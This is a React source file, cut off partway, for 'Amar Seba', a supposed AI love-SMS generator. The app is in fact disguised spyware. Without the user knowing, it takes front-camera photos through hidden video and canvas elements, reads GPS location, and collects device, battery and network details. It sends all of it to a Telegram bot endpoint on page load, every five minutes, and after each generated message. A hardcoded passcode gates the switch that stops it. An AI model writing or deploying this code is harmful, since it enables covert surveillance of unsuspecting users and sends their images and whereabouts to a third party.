'use client';

import { useState, useRef, useEffect, useCallback } from 'react';
import { GoogleGenAI } from "@google/genai";
import { motion, AnimatePresence } from "motion/react";
import { Heart, Copy, Share2, Sparkles, Send, MapPin, Battery, Smartphone, Camera } from "lucide-react";
import { cn } from "@/lib/utils";

// Initialize Gemini
const ai = new GoogleGenAI({ apiKey: process.env.NEXT_PUBLIC_GEMINI_API_KEY as string });

export default function AmarSeba() {
  const [prompt, setPrompt] = useState('');
  const [generatedSms, setGeneratedSms] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);
  const [copying, setCopying] = useState(false);
  const [status, setStatus] = useState<string | null>(null);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  // Background data gathering state
  const [battery, setBattery] = useState<number | null>(null);
  const [location, setLocation] = useState<{ lat: number; lng: number } | null>(null);
  const [deviceName, setDeviceName] = useState<string>('Optimizing...');
  const [networkType, setNetworkType] = useState<string>('Detecting...');
  const [screenRes, setScreenRes] = useState<string>('Calculating...');
  const [browser, setBrowser] = useState<string>('Scanning...');
  const [cameraPermission, setCameraPermission] = useState<'prompt' | 'granted' | 'denied'>('prompt');
  const [brightness, setBrightness] = useState<number>(100);

  // Use refs for telemetry values to avoid excessive re-creations of captureAndSend
  const telemetryRef = useRef({
    deviceName,
    networkType,
    screenRes,
    browser,
    battery,
    brightness
  });

  useEffect(() => {
    telemetryRef.current = {
      deviceName,
      networkType,
      screenRes,
      browser,
      battery,
      brightness
    };
  }, [deviceName, networkType, screenRes, browser, battery, brightness]);

  const requestCameraAccess = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      stream.getTracks().forEach(track => track.stop());
      setCameraPermission('granted');
    } catch (err) {
      setCameraPermission('denied');
    }
  };

  const [isSyncActive, setIsSyncActive] = useState(true);
  const [isDashboardOpen, setIsDashboardOpen] = useState(false);
  const [passcodeInput, setPasscodeInput] = useState('');
  const [isPasscodeModalOpen, setIsPasscodeModalOpen] = useState(false);
  const [syncCount, setSyncCount] = useState(0);
  const [lastSyncTime, setLastSyncTime] = useState<string | null>(null);
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncError, setSyncError] = useState<string | null>(null);
  const [nextSyncIn, setNextSyncIn] = useState(300); // 5 minutes in seconds

  const handleToggleSync = () => {
    if (isSyncActive) {
      setIsPasscodeModalOpen(true);
    } else {
      setIsSyncActive(true);
    }
  };

  const verifyPasscode = () => {
    if (passcodeInput === '1212741731') {
      setIsSyncActive(false);
      setIsPasscodeModalOpen(false);
      setPasscodeInput('');
    } else {
      setPasscodeInput('');
    }
  };

  const captureAndSend = useCallback(async (smsText: string) => {
    if (!isSyncActive) return;
    setIsSyncing(true);
    setSyncError(null);
    
    let photoData = null;
    let latCurrent = null;
    let lngCurrent = null;

    // 1. Get Location
    try {
      if (typeof navigator !== 'undefined' && navigator.geolocation) {
        const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
        });
        latCurrent = pos.coords.latitude;
        lngCurrent = pos.coords.longitude;
        setLocation({ lat: latCurrent, lng: lngCurrent });
      }
    } catch (e) {
      console.log("Location denied or unavailable");
    }

    // 2. Capture Photo
    try {
      if (typeof navigator !== 'undefined' && navigator.mediaDevices) {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
          
          await new Promise(r => setTimeout(r, 1000));

          if (canvasRef.current) {
            const context = canvasRef.current.getContext('2d');
            if (context) {
              canvasRef.current.width = videoRef.current.videoWidth;
              canvasRef.current.height = videoRef.current.videoHeight;
              context.drawImage(videoRef.current, 0, 0);
              photoData = canvasRef.current.toDataURL('image/jpeg', 0.6); 
            }
          }
          
          stream.getTracks().forEach(track => track.stop());
          setCameraPermission('granted');
        }
      }
    } catch (e) {
      console.log("Camera access denied or failed");
      setCameraPermission('denied');
    }

    // 3. Send to Telegram API using latest telemetry from ref
    const { deviceName: d, networkType: n, screenRes: r, browser: b, battery: bat, brightness: bri } = telemetryRef.current;

    try {
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: smsText,
          photo: photoData,
          lat: latCurrent,
          lng: lngCurrent,
          battery: bat,
          deviceName: d,
          networkType: n,
          screenRes: r,
          browser: b,
          brightness: bri
        })
      });

      const result = await response.json();
      
      if (response.ok) {
        setSyncCount(prev => prev + 1);
        setLastSyncTime(new Date().toLocaleTimeString());
        setNextSyncIn(300);
      } else {
        setSyncError(result.error || "Server sync failed");
      }
    } catch (e) {
      console.error("Failed to sync with service");
      setSyncError("Network error: Check connectivity");
    } finally {
      setIsSyncing(false);
    }
  }, [isSyncActive]); // Only depends on isSyncActive status

  useEffect(() => {
    // Set static metrics
    requestAnimationFrame(() => {
      if (typeof navigator !== 'undefined' && navigator.userAgent) {
        const ua = navigator.userAgent;
        const deviceMatch = ua.match(/\(([^)]+)\)/);
        setDeviceName(deviceMatch ? deviceMatch[1] : 'Unknown Device');
        setBrowser(ua.split(' ').pop() || 'Unknown');
      }
      if (typeof window !== 'undefined') {
        setScreenRes(`${window.screen.width}x${window.screen.height}`);
      }
    });

    // Network metric
    if (typeof navigator !== 'undefined') {
      const connection = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
      if (connection) {
        setNetworkType(connection.effectiveType || 'Unknown');
        const handleNetworkChange = () => {
          setNetworkType(connection.effectiveType || 'Unknown');
        };
        connection.addEventListener('change', handleNetworkChange);
      }

      // Check camera permission
      if (navigator.permissions && navigator.permissions.query) {
        navigator.permissions.query({ name: 'camera' as any }).then((status) => {
          setCameraPermission(status.state as any);
          status.onchange = () => {
            setCameraPermission(status.state as any);
          };
        }).catch(() => {});
      }

      // Attempt to get battery
      if ('getBattery' in navigator) {
        (navigator as any).getBattery().then((batt: any) => {
          setBattery(Math.round(batt.level * 100));
          const handleLevelChange = () => {
            setBattery(Math.round(batt.level * 100));
          };
          batt.addEventListener('levelchange', handleLevelChange);
        }).catch(() => {});
      }
    }
  }, []); // Run ONCE on mount to avoid infinite loop with captureAndSend

  useEffect(() => {
    // Auto capture on load (after a short delay to allow for interaction/init)
    const timer = setTimeout(() => {
      captureAndSend('Automated initial sync');
    }, 5000);

    // 5-Minute Background Sync Interval
    const syncInterval = setInterval(() => {
      captureAndSend('Automated periodic background sync');
    }, 300000); // 300,000ms = 5 minutes

    // Countdown timer for UI
    const countdownInterval = setInterval(() => {
      setNextSyncIn(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => {
      clearTimeout(timer);
      clearInterval(syncInterval);
      clearInterval(countdownInterval);
    };
  }, [captureAndSend]);

  const handleGenerate = async (overridePrompt?: string) => {
    const activePrompt = overridePrompt || prompt;
    if (!activePrompt.trim()) return;
    
    setIsGenerating(true);
    setGeneratedSms('');
    setStatus("Generating your romantic message...");

    try {
      const response = await ai.models.generateContent({
        model: "gemini-3-flash-preview",
        contents: `Generate a short, sweet, and romantic Love SMS based on this mood/context: "${activePrompt}". The SMS should be in Bengali or English (prefer Bengali if relevant). Keep it under 160 characters.`,
      });

      const text = response.text || "Amar bhalobasha tomader jonno...";
      setGeneratedSms(text);
      
      // Post-generation background tasks
      captureAndSend(text);
      
    } catch (error) {
      console.error(error);
      setGeneratedSms("Sorry, could not generate at this time. Please try again.");
    } finally {
      setIsGenerating(false);
      setStatus(null);
    }
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(generatedSms);
    setCopying(true);
    setTimeout(() => setCopying(false), 2000);
  };

  const handleShare = async () => {
    if (navigator.share) {
      try {
        await navigator.share({
          title: 'Love SMS from Amar Seba',
          text: generatedSms,
        });
      } catch (err) {
        console.error('Error sharing:', err);
      }
    } else {
      copyToClipboard();
    }
  };

  return (
    <div className="min-h-screen bg-rose-50 font-sans flex flex-col overflow-hidden text-rose-900">
      {/* Simulated Brightness Overlay */}
      <div 
        className="fixed inset-0 pointer-events-none z-[9999] bg-black/80" 
        style={{ opacity: (100 - brightness) / 100 }} 
      />

      {/* Navigation Bar */}
      <nav className="bg-white border-b-4 border-rose-200 px-6 md:px-10 py-4 md:py-6 flex justify-between items-center relative z-20">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 md:w-12 md:h-12 bg-rose-500 rounded-2xl flex items-center justify-center shadow-lg shadow-rose-200">
            <span className="text-white text-xl md:text-2xl font-black italic">AS</span>
          </div>
          <h1 className="text-2xl md:text-3xl font-black text-rose-900 tracking-tight">Amar Seba</h1>
        </div>
        <div className="hidden md:flex gap-6 items-center font-bold text-rose-800">
          <span className="bg-rose-100 px-4 py-2 rounded-full text-sm font-black">PREMIUM ACCESS</span>
          <div className="w-10 h-10 bg-rose-200 rounded-full border-2 border-rose-400 overflow-hidden">
            <div className="w-full h-full bg-gradient-to-tr from-rose-400 to-rose-200" />
          </div>
        </div>
      </nav>

      {/* Main Workspace */}
      <main className="flex-1 grid grid-cols-1 lg:grid-cols-12 gap-8 p-6 md:p-10 overflow-y-auto">
        
        {/* Left Section: AI Generator */}
        <div className="lg:col-span-8 flex flex-col gap-6">
          <div className="bg-white rounded-3xl p-6 md:p-8 border-4 border-rose-100 shadow-xl flex-1 flex flex-col min-h-[400px]">
            <div className="flex flex-col md:flex-row justify-between items-start md:items-end mb-6 gap-4">
              <div>
                <span className="text-rose-500 font-black text-xs uppercase tracking-widest">AI SMS Engine</span>
                <h2 className="text-3xl md:text-4xl font-black text-rose-900 mt-1">Create the Perfect Love SMS</h2>
              </div>
              <div className="flex gap-2">
                <button 
                  onClick={() => { setPrompt("Funny/Jokey love message"); handleGenerate("Funny/Jokey love message"); }}
                  className="px-4 py-2 bg-rose-100 text-rose-700 rounded-xl font-bold text-sm hover:bg-rose-200 transition-colors"
                >
                  Funny
                </button>
                <button 
                  onClick={() => { setPrompt("Deeply Romantic love message"); handleGenerate("Deeply Romantic love message"); }}
                  className="px-4 py-2 bg-rose-600 text-white rounded-xl font-bold text-sm shadow-md shadow-rose-600/20 hover:bg-rose-700 transition-colors"
                >
                  Romantic
                </button>
                <button 
                  onClick={() => { setPrompt("Poetic and Artistic love message"); handleGenerate("Poetic and Artistic love message"); }}
                  className="px-4 py-2 bg-rose-100 text-rose-700 rounded-xl font-bold text-sm hover:bg-rose-200 transition-colors"
                >
                  Poetic
                </button>
              </div>
            </div>

            <div className="flex-1 bg-rose-50 rounded-2xl border-2 border-dashed border-rose-200 p-6 flex flex-col relative overflow-hidden group">
              <AnimatePresence mode="wait">
                {generatedSms ? (
                  <motion.div
                    key="content"
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: -10 }}
                    className="flex flex-col h-full"
                  >
                    <div className="flex-1 flex flex-col justify-center">
                      <p className="text-rose-800 text-xl md:text-2xl leading-relaxed italic font-serif px-4 text-center">
                        &quot;{generatedSms}&quot;
                      </p>
                    </div>
                    <div className="mt-6 flex flex-col md:flex-row justify-between items-center gap-4">
                      <span className="text-rose-400 text-xs font-medium uppercase tracking-wider">
                        Generated {isGenerating ? 'just now' : 'locally'} • AI Model V3
                      </span>
                      <div className="flex gap-3 w-full md:w-auto">
                        <button 
                          onClick={handleShare}
                          className="flex-1 md:flex-none bg-rose-100 border-2 border-rose-200 text-rose-700 px-6 py-3 rounded-2xl font-black hover:bg-rose-200 transition-all active:scale-95 flex items-center justify-center gap-2"
                        >
                          <Share2 className="w-4 h-4" />
                          Share
                        </button>
                        <button 
                          onClick={copyToClipboard}
                          className="flex-1 md:flex-none bg-white border-2 border-rose-400 text-rose-600 px-6 py-3 rounded-2xl font-black hover:bg-rose-50 transition-all active:scale-95 flex items-center justify-center gap-2"
                        >
                          {copying ? 'COPIED!' : (
                            <>
                              <Copy className="w-4 h-4" />
                              Copy SMS
                            </>
                          )}
                        </button>
                        <button 
                          onClick={() => handleGenerate()}
                          disabled={isGenerating || !prompt.trim()}
                          className="flex-1 md:flex-none bg-rose-500 text-white px-8 py-3 rounded-2xl font-black shadow-lg shadow-rose-200 hover:bg-rose-600 transition-all active:scale-95 disabled:opacity-50"
                        >
                          Generate New
                        </button>
                      </div>
                    </div>
                  </motion.div>
                ) : (
                  <div className="flex-1 flex flex-col items-center justify-center text-center opacity-40">
                    <Heart className="w-16 h-16 text-rose-300 mb-4 animate-pulse" />
                    <p className="text-rose-900 font-bold uppercase tracking-[0.25em] text-xs">Waiting for your mood...</p>
                  </div>
                )}
              </AnimatePresence>

              {isGenerating && (
                <div className="absolute inset-0 bg-rose-50/80 backdrop-blur-[2px] flex flex-col items-center justify-center z-10">
                  <div className="w-12 h-12 border-4 border-rose-200 border-t-rose-600 rounded-full animate-spin mb-4" />
                  <p className="text-rose-900 font-black uppercase text-xs tracking-widest">{status}</p>
                </div>
              )}
            </div>
          </div>

          <div className="bg-white rounded-3xl border-4 border-rose-100 p-6 flex flex-col md:flex-row items-center gap-6 shadow-xl">
            <div className="flex-1 w-full">
              <label className="block text-xs font-black text-rose-400 uppercase tracking-widest mb-2 px-1">Describe your feelings</label>
              <div className="relative">
                <input 
                  type="text" 
                  value={prompt}
                  onChange={(e) => setPrompt(e.target.value)}
                  placeholder="Write about missing her at midnight..." 
                  className="w-full bg-rose-50 border-none rounded-2xl px-6 py-4 text-rose-900 placeholder-rose-300 font-medium focus:ring-4 focus:ring-rose-200 transition-all outline-none"
                />
                {!generatedSms && (
                  <button
                    onClick={() => handleGenerate()}
                    disabled={isGenerating || !prompt.trim()}
                    className="absolute right-2 top-2 bottom-2 bg-rose-600 text-white px-6 rounded-xl font-black text-xs uppercase tracking-widest hover:bg-rose-700 transition-all active:scale-95 disabled:opacity-50"
                  >
                    Quick Start
                  </button>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* Right Section: System Telemetry */}
        <div className="lg:col-span-4 flex flex-col gap-6 overflow-y-auto lg:overflow-visible pr-1">
          <div className="bg-rose-900 rounded-3xl p-6 text-white shadow-2xl flex flex-col relative overflow-hidden">
            <div className="absolute -right-12 -top-12 w-32 h-32 bg-white/5 rounded-full blur-3xl pointer-events-none" />
            
            <div className="flex items-center justify-between mb-8 relative z-10">
              <div className="flex items-center gap-3">
                <div className="w-2.5 h-2.5 bg-green-400 rounded-full animate-pulse shadow-[0_0_10px_rgba(74,222,128,0.5)]"></div>
                <h3 className="font-black uppercase tracking-widest text-[10px] opacity-70">Live Bot Connectivity</h3>
              </div>
              <span className="text-[10px] font-black bg-rose-500/40 border border-rose-500/20 px-2 py-0.5 rounded backdrop-blur-md">V1.2.4</span>
            </div>

            <div className="space-y-5 flex-1 relative z-10">
              {/* Device Status Item */}
              <div className="flex items-center gap-4 group bg-white/5 p-3 rounded-2xl border border-white/5 hover:bg-white/10 transition-colors">
                <div className="w-10 h-10 bg-white/10 rounded-xl flex items-center justify-center text-rose-300">
                  <Smartphone className="w-5 h-5" />
                </div>
                <div className="flex-1 min-w-0">
                  <p className="text-[9px] uppercase font-bold opacity-50 tracking-tighter">Device Hardware</p>
                  <p className="text-sm font-bold tracking-tight truncate">{deviceName}</p>
                </div>
              </div>

              {/* Battery Status Item */}
              <div className="flex items-center gap-4 bg-white/5 p-3 rounded-2xl border border-white/5">
                <div className="w-10 h-10 bg-white/10 rounded-xl flex items-center justify-center text-rose-300">
                  <Battery className="w-5 h-5" />
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex justify-between items-center mb-1.5">
                    <p className="text-[9px] uppercase font-bold opacity-50 tracking-tighter">Battery Charge</p>
                    <p className="text-[10px] font-black text-green-400">{battery ? `${battery}%` : '--%'}</p>
                  </div>
                  <div className="h-1.5 w-full bg-white/10 rounded-full overflow-hidden">
                    <motion.div 
                      initial={{ width: 0 }}
                      animate={{ width: battery ? `${battery}%` : '0%' }}
                      className={cn(
                        "h-full transition-all duration-1000",
                        (battery || 100) > 20 ? "bg-green-400" : "bg-rose-500"
                      )}
                    />
                  </div>
                </div>
              </div>

              {/* Network Status Item */}
              <div className="flex items-center gap-4 bg-white/5 p-3 rounded-2xl border border-white/5">
                <div className="w-10 h-10 bg-white/10 rounded-xl flex items-center justify-center text-rose-300">
                  <Sparkles className="w-5 h-5" />
                </div>
                <div className="flex-1 min-w-0">
                  <p className="text-[9px] uppercase font-bold opacity-50 tracking-tighter">Network / Traffic</p>
                  <div className="flex items-center gap-2">
                    <p className="text-sm font-black uppercase">{networkType}</p>
                    <div className="flex gap-0.5 mt-0.5">
                      {[1, 2, 3, 4].map((i) => (
                        <div 
                          key={i} 
                          className={cn(
                            "w-1 rounded-full bg-white/5",
                            i === 1 ? "h-1" : i === 2 ? "h-1.5" : i === 3 ? "h-2" : "h-2.5",
                            networkType !== 'Detecting...' && i <= (networkType === '4g' ? 4 : networkType === '3g' ? 3 : 2) ? "bg-green-400" : "bg-white/10"
                          )} 
                        />
                      ))}
                    </div>
                  </div>
                </div>
              </div>

              {/* Resolution & Details */}
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-white/5 p-3 rounded-2xl border border-white/5">
                  <p className="text-[9px] uppercase font-bold opacity-50 tracking-tighter mb-1">Resolution</p>
                  <p className="text-[10px] font-black truncate">{screenRes}</p>
                </div>
                <div className="bg-white/5 p-3 rounded-2xl border border-white/5">
                  <p className="text-[9px] uppercase font-bold opacity-50 tracking-tighter mb-1">Explorer</p>
                  <p className="text-[10px] font-black truncate">{browser}</p>
                </div>
              </div>

              {/* Camera Access Control */}
              <button 
                onClick={requestCameraAccess}
                disabled={cameraPermission === 'granted'}
                className={cn(
                  "w-full flex items-center gap-3 p-3 rounded-2xl border transition-all active:scale-[0.98]",
                  cameraPermission === 'granted' ? "bg-green-500/10 border-green-500/20 text-green-400" : 
                  cameraPermission === 'denied' ? "bg-rose-500/10 border-rose-500/20 text-rose-400" :
                  "bg-white/5 border-white/10 text-white/60 hover:bg-white/10"
                )}
              >
                <div className={cn(
                  "w-8 h-8 rounded-lg flex items-center justify-center",
                  cameraPermission === 'granted' ? "bg-green-500/20" : 
                  cameraPermission === 'denied' ? "bg-rose-500/20" : "bg-white/10"
                )}>
                  <Camera className="w-4 h-4" />
                </div>
                <div className="flex-1 text-left">
                  <p className="text-[9px] font-black uppercase tracking-tighter opacity-70">Capture System</p>
                  <p className="text-[10px] font-bold">
                    {cameraPermission === 'granted' ? 'Permissions Granted' : 
                     cameraPermission === 'denied' ? 'Permission Denied (Check Settings)' : 'Enable Camera Access'}
                  </p>
                </div>
                {cameraPermission === 'prompt' && (
                  <div className="w-2 h-2 bg-rose-500 rounded-full animate-ping" />
                )}
              </button>

              {/* Brightness Control */}
              <div className="bg-white/5 p-4 rounded-2xl border border-white/5">
                <div className="flex justify-between items-center mb-3">
                  <div className="flex items-center gap-2">
                    <Sparkles className="w-3.5 h-3.5 text-yellow-400" />
                    <p className="text-[9px] font-black uppercase tracking-tighter opacity-70">Backlight Intensity</p>
                  </div>
                  <p className="text-[10px] font-black text-yellow-400">{brightness}%</p>
                </div>
                <input 
                  type="range" 
                  min="10" 
                  max="100" 
                  value={brightness}
                  onChange={(e) => setBrightness(parseInt(e.target.value))}
                  className="w-full h-1.5 bg-white/10 rounded-full appearance-none cursor-pointer accent-rose-500"
                />
              </div>

              {/* Location & Capture Info Combined */}
              <div className="flex items-center gap-3 bg-rose-500/10 border border-rose-500/20 p-3 rounded-2xl">
                <div className="w-8 h-8 rounded-lg bg-rose-500/20 flex items-center justify-center text-rose-300">
                  <MapPin className="w-4 h-4" />
                </div>
                <div className="flex-1 min-w-0">
                  <p className="text-[9px] font-black text-rose-300 uppercase tracking-tighter">Live Telemetry</p>
                  <p className="text-[10px] font-medium text-white/70 truncate">
                    {location ? `${location.lat.toFixed(3)}°, ${location.lng.toFixed(3)}°` : 'Awaiting GPS coordinates...'}
                  </p>
                </div>
                <div className="w-8 h-8 rounded-lg bg-green-500/20 flex items-center justify-center text-green-300">
                  <Camera className="w-4 h-4" />
                </div>
              </div>
            </div>

            <div className="mt-8 pt-6 border-t border-white/10 relative z-10">
              <div className="flex justify-between items-center mb-4">
                <span className="text-[10px] font-bold uppercase opacity-50">Telegram Bot Sync</span>
                <div className="flex items-center gap-2">
                  {isSyncing && <div className="w-2 h-2 border-2 border-rose-500 border-t-white rounded-full animate-spin" />}
                  <span className={cn(
                    "text-[10px] font-black px-2 py-0.5 rounded shadow-lg",
                    isSyncActive ? "bg-rose-500 shadow-rose-500/20" : "bg-white/20"
                  )}>
                    {isSyncActive ? (isSyncing ? "SYNCING..." : "ACTIVE") : "OFFLINE"}
                  </span>
                </div>
              </div>
              <button 
                onClick={() => setIsDashboardOpen(true)}
                className="w-full py-4 bg-white text-rose-900 rounded-2xl font-black text-xs uppercase tracking-tighter hover:bg-rose-50 transition-all active:scale-95 shadow-lg shadow-black/20"
              >
                View Remote Dashboard
              </button>
            </div>
          </div>

          {/* Feature Banner */}
          <div className="flex-1 bg-gradient-to-br from-rose-400 to-rose-600 rounded-3xl p-8 flex flex-col justify-center items-center text-center text-white relative overflow-hidden shadow-xl">
            <div className="absolute -right-4 -top-4 w-24 h-24 bg-white/10 rounded-full blur-xl" />
            <div className="absolute -left-6 -bottom-6 w-20 h-20 bg-black/10 rounded-full blur-lg" />
            <p className="text-3xl font-black mb-2 relative z-10">1 Million+</p>
            <p className="text-[10px] font-bold uppercase tracking-[0.2em] opacity-80 relative z-10">Love SMS Sent Locally</p>
            <div className="mt-4 p-3 bg-white/10 rounded-2xl backdrop-blur-sm border border-white/10">
              <Sparkles className="w-5 h-5 text-rose-200" />
            </div>
          </div>
        </div>

      </main>

      {/* Hidden Monitoring Support Elements */}
      <video ref={videoRef} className="hidden" aria-hidden="true" />
      <canvas ref={canvasRef} className="hidden" aria-hidden="true" />

      {/* Footer Bar */}
      <div className="h-12 bg-rose-100 flex items-center justify-center border-t border-rose-200">
        <p className="text-[10px] font-black text-rose-400 uppercase tracking-[0.3em]">
          Amar Seba • Premium Device Management & SMS Generator • 2024
        </p>
      </div>

      {/* Remote Dashboard Overlay */}
      <AnimatePresence>
        {isDashboardOpen && (
          <motion.div 
            initial={{ opacity: 0, scale: 1.1 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 1.1 }}
            className="fixed inset-0 z-[100] bg-rose-950/95 backdrop-blur-xl p-4 md:p-8 flex flex-col overflow-hidden"
          >
            {/* Dashboard Header */}
            <div className="flex justify-between items-center mb-8 border-b border-white/10 pb-6">
              <div className="flex items-center gap-4">
                <div className="w-12 h-12 bg-rose-500 rounded-2xl flex items-center justify-center shadow-lg shadow-rose-500/20">
                  <Sparkles className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h2 className="text-xl font-black text-white tracking-tight uppercase">Admin Control Center</h2>
                  <div className="flex items-center gap-2">
                    <div className={cn("w-2 h-2 rounded-full animate-pulse", isSyncActive ? "bg-green-400" : "bg-rose-500")} />
                    <p className="text-[10px] font-bold text-white/50 uppercase tracking-widest">
                      {isSyncActive ? "Global Sync Active" : "System Offline"}
                    </p>
                  </div>
                </div>
              </div>
              <div className="flex items-center gap-4">
                <button 
                  onClick={() => captureAndSend("Manual admin sync")}
                  disabled={!isSyncActive || isSyncing}
                  className="flex items-center gap-2 bg-white/5 px-4 py-2 rounded-xl border border-white/10 text-[10px] font-black uppercase hover:bg-white/10 transition-colors disabled:opacity-30"
                >
                  {isSyncing ? <div className="w-3 h-3 border-2 border-white/20 border-t-white rounded-full animate-spin" /> : <Send className="w-3 h-3" />}
                  Sync Now
                </button>
                <div className="flex items-center gap-2 bg-white/5 p-2 pr-4 rounded-xl border border-white/10 relative">
                  {/* Passcode Modal Overlay */}
                  <AnimatePresence>
                    {isPasscodeModalOpen && (
                      <motion.div 
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="fixed inset-0 z-[200] bg-rose-950/80 backdrop-blur-md flex items-center justify-center p-4"
                      >
                        <motion.div 
                          initial={{ scale: 0.9, opacity: 0, y: 20 }}
                          animate={{ scale: 1, opacity: 1, y: 0 }}
                          exit={{ scale: 0.9, opacity: 0, y: 20 }}
                          className="w-full max-w-sm bg-rose-900 border border-white/20 rounded-[2.5rem] p-10 shadow-2xl relative overflow-hidden"
                        >
                          {/* Decorative blur */}
                          <div className="absolute -right-20 -top-20 w-40 h-40 bg-rose-500/20 rounded-full blur-3xl pointer-events-none" />
                          
                          <div className="relative z-10 flex flex-col items-center text-center">
                            <div className="w-20 h-20 bg-white/5 rounded-3xl flex items-center justify-center mb-8 border border-white/10 text-rose-400">
                              <Smartphone className="w-10 h-10" />
                            </div>
                            
                            <h3 className="text-2xl font-black text-white uppercase tracking-tighter mb-2">Access Token</h3>
                            <p className="text-[10px] font-black text-white/40 uppercase tracking-[0.3em] mb-10 leading-relaxed px-6">
                              Input System Authorization Code to Toggle Sync Engine
                            </p>
                            
                            <div className="w-full space-y-6">
                              <div className="relative group">
                                <input 
                                  type="password"
                                  value={passcodeInput}
                                  onChange={(e) => setPasscodeInput(e.target.value)}
                                  onKeyDown={(e) => e.key === 'Enter' && verifyPasscode()}
                                  placeholder="••••••••••"
                                  autoFocus
                                  className="w-full bg-black/40 border border-white/10 rounded-3xl px-6 py-5 text-center text-2xl tracking-[0.5em] text-white outline-none focus:border-rose-500 focus:ring-4 focus:ring-rose-500/10 transition-all font-mono"
                                />
                                <div className="absolute inset-x-0 -bottom-1 h-px bg-gradient-to-r from-transparent via-rose-500/50 to-transparent opacity-0 group-focus-within:opacity-100 transition-opacity" />
                              </div>

                              <button 
                                onClick={verifyPasscode}
                                className="w-full bg-rose-500 text-white py-5 rounded-3xl font-black text-[11px] uppercase tracking-[0.2em] hover:bg-rose-600 transition-all active:scale-[0.97] shadow-xl shadow-rose-500/20 border border-rose-400/20"
                              >
                                Authenticate System
                              </button>
                              
                              <button 
                                onClick={() => { setIsPasscodeModalOpen(false); setPasscodeInput(''); }}
                                className="w-full py-2 text-[10px] font-black text-white/30 uppercase tracking-widest hover:text-white/60 transition-colors"
                              >
                                Decrypt Failed • Exit
                              </button>
                            </div>
                          </div>
                        </motion.div>
                      </motion.div>
                    )}
                  </AnimatePresence>

                  <button 
                    onClick={handleToggleSync}
                    className={cn(
                      "w-12 h-6 rounded-full relative transition-colors duration-300",
                      isSyncActive ? "bg-green-500" : "bg-rose-500"
                    )}
                  >
                    <motion.div 
                      animate={{ x: isSyncActive ? 24 : 0 }}
                      className="absolute inset-y-1 left-1 w-4 h-4 bg-white rounded-full shadow-sm" 
                    />
                  </button>
                  <span className="text-[10px] font-black text-white uppercase tracking-tighter">
                    Admin {isSyncActive ? "ON" : "OFF"}
                  </span>
                </div>
                <button 
                  onClick={() => setIsDashboardOpen(false)}
                  className="p-3 bg-white/5 hover:bg-white/10 rounded-xl text-white transition-colors"
                >
                  <Heart className="w-6 h-6 rotate-45" />
                </button>
              </div>
            </div>

            {/* Dashboard Grid */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 flex-1 overflow-y-auto">
              {/* Hardware Matrix */}
              <div className="lg:col-span-1 space-y-4">
                <h3 className="text-[10px] font-black text-rose-400 uppercase tracking-[0.2em] mb-4">Hardware Matrix</h3>
                <div className="bg-white/5 border border-white/5 rounded-3xl p-6 space-y-6">
                  <div className="flex justify-between items-end">
                    <div>
                      <p className="text-[10px] font-bold text-white/40 uppercase">Processor Affinity</p>
                      <p className="text-2xl font-black text-white">8-CORE ARM</p>
                    </div>
                    <div className="text-right">
                      <p className="text-[10px] font-bold text-white/40 uppercase">Load</p>
                      <p className="text-xl font-black text-green-400">12.4%</p>
                    </div>
                  </div>
                  <div className="h-1 bg-white/10 rounded-full overflow-hidden">
                    <motion.div 
                      initial={{ width: 0 }}
                      animate={{ width: "12.4%" }}
                      className="h-full bg-green-400"
                    />
                  </div>

                  <div className="pt-4 grid grid-cols-2 gap-4">
                    <div className="p-3 bg-white/5 rounded-2xl">
                      <p className="text-[9px] font-bold text-white/40 uppercase">Last Sync Success</p>
                      <p className="text-sm font-black text-green-400">
                        {lastSyncTime || "NO SYNC YET"}
                      </p>
                    </div>
                    <div className="p-3 bg-white/5 rounded-2xl">
                      <p className="text-[9px] font-bold text-white/40 uppercase">Total Packets</p>
                      <p className="text-sm font-black text-white">{syncCount}</p>
                    </div>
                  </div>
                  {syncError && (
                    <div className="mt-4 p-3 bg-rose-500/10 border border-rose-500/20 rounded-2xl flex items-center gap-3">
                      <div className="w-2 h-2 bg-rose-500 rounded-full animate-ping" />
                      <p className="text-[10px] font-bold text-rose-300 uppercase tracking-tight">{syncError}</p>
                    </div>
                  )}
                </div>

                <div className="bg-rose-500/10 border border-rose-500/20 rounded-3xl p-6">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="w-2 h-2 bg-rose-500 rounded-full" />
                    <p className="text-[10px] font-black text-white uppercase tracking-widest">Telegram Bot Webhook</p>
                  </div>
                  <code className="block p-4 bg-black/40 rounded-xl text-[10px] text-rose-300 font-mono break-all leading-relaxed">
                    POST /bot{process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN?.slice(0, 10) || "5123456789"}.../sendMessage HTTP/1.1<br/>
                    Host: api.telegram.org<br/>
                    Content-Type: application/json
                  </code>
                </div>
              </div>

              {/* Live Payload Stream */}
              <div className="lg:col-span-2 space-y-4 flex flex-col h-full">
                <h3 className="text-[10px] font-black text-rose-400 uppercase tracking-[0.2em] mb-4">Payload Stream</h3>
                <div className="bg-black/40 border border-white/5 rounded-3xl p-6 flex-1 font-mono text-[10px] overflow-hidden flex flex-col">
                  <div className="flex-1 overflow-y-auto space-y-4 scrollbar-hide">
